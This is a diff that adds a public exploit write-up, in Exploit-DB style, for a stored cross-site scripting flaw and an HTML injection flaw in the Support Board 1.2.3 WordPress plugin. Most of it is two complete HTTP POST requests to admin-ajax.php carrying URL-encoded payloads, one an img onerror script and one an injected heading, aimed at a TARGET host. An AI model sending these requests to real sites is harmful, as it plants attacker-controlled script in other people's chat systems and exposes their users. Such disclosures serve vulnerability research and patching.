@@ -1,0 +1,52 @@
+# Exploit Title: Wordpress Plugin Support Board 1.2.3 - Cross-Site Scripting
+# Date: 2018-10-16
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://schiocco.com/
+# Software Link : https://board.support/
+# Software : Support Board - Chat And Help Desk
+# Version : v1.2.3
+# Vulernability Type : Code Injection
+# Vulenrability : HTML Injection and Stored XSS
+# CVE : N/A
+
+# In the Schiocco "Support Board - Chat And Help Desk" plugin 1.2.3 for WordPress, 
+# a Stored XSS vulnerability has been discovered in file upload areas in the 
+# Chat and Help Desk sections via the msg parameter 
+# in a /wp-admin/admin-ajax.php sb_ajax_add_message action.
+
+# HTTP POST Request : [Stored XSS]
+ 
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://TARGET/chat/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 450
+Cookie: _ga=GA1.2.1452102121.1539634100; _gid=GA1.2.1034601494.1539634100; PHPSESSID=pljbkl7n96fpl5uicnbec21f77
+Connection: close
+
+action=sb_ajax_add_message&msg=&files=https%3A%2F%2FTARGET%2Fwp-content%2Fuploads%2Fsupportboard%2F70765091%2F%22%3E%3Cimg+src%3Dx+onerror%3Dalert(%22ismailtasdelen%22)%3E.jpg%7C%22%3E%3Cimg+src%3Dx+onerror%3Dalert(%22ismailtasdelen%22)%3E.jpg&time=10%2F15%2F2018%2C+4%3A23%3A42+PM&user_id=70765091&user_img=https%3A%2F%2Fboard.support%2Fwp-content%2Fuploads%2F2017%2F07%2Fuser.jpg&user_name=James+Wilson&user_type=user&environment=wp&sb_lang=
+
+# In the v1.2.3 version of the Support Board - Chat And Help Desk PHP & Wordpress Plugin, 
+# the Stored XSS vulnerability has been discovered in the HTML Injection vulnerability and 
+# file upload areas in the Chat and Help Desk sections of Schiocco.
+# HTTP POST Request : [HTML Injection]
+ 
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://TARGET/desk-demo/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 288
+Cookie: _ga=GA1.2.1452102121.1539634100; _gid=GA1.2.1034601494.1539634100; PHPSESSID=pljbkl7n96fpl5uicnbec21f77
+Connection: close
+
+action=sb_ajax_add_message&msg=%26%238220%3B%3E%3Ch1%3EIsmail+Tasdelen%3C%2Fh1%3E&files=&time=10%2F15%2F2018%2C+4%3A19%3A45+PM&user_id=70765091&user_img=https%3A%2F%2Fboard.support%2Fwp-content%2Fuploads%2F2017%2F07%2Fuser.jpg&user_name=James+Wilson&user_type=user&environment=wp&sb_lang=
